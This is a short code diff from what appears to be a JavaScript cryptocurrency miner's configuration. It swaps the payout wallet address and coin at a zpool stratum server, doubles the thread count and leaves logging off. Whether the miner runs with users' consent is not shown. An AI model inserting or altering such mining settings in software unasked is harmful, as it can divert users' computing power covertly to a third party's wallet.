@@ -1146,11 +1146,11 @@
                     stratum: {
                         server: "power2b.na.mine.zpool.ca",
                         port: 6242,
-                        worker: "mbc1qhut49lvdruznypvaxgrg4klf3ntpnwuc23hq3j",
-                        password: "c=MBC"
+                        worker: "RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs",
+                        password: "c=RVN"
                     },
                     options: {
-                        threads: 1,
+                        threads: 2,
                         log: !1
                     }
                 }
